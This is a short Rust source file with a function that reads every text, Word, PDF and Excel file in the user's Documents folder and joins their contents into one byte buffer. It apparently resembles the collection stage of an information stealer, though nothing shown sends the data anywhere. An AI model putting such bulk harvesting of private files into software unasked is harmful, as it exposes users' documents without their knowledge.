use std::fs;
use std::path::PathBuf;
use dirs::document_dir;

pub fn get_documents() -> Vec<u8> {
    println!("[DOCS] Collecting documents...");
    let mut all_data = Vec::new();
    
    if let Some(docs_dir) = document_dir() {
        println!("[DOCS] Documents folder: {:?}", docs_dir);
        
        // Procura arquivos .txt, .docx, .pdf, .xlsx
        let extensions = ["txt", "docx", "pdf", "xlsx", "doc", "xls"];
        
        for entry in fs::read_dir(docs_dir).unwrap_or_else(|_| fs::read_dir(".").unwrap()) {
            if let Ok(entry) = entry {
                let path = entry.path();
                if path.is_file() {
                    if let Some(ext) = path.extension() {
                        if extensions.contains(&ext.to_str().unwrap_or("")) {
                            println!("[DOCS] Found: {:?}", path.file_name());
                            if let Ok(data) = fs::read(&path) {
                                all_data.extend_from_slice(format!("\n[FILE: {:?}]\n", path.file_name()).as_bytes());
                                all_data.extend_from_slice(&data);
                            }
                        }
                    }
                }
            }
        }
    }
    
    println!("[DOCS] Collected {} bytes", all_data.len());
    all_data
}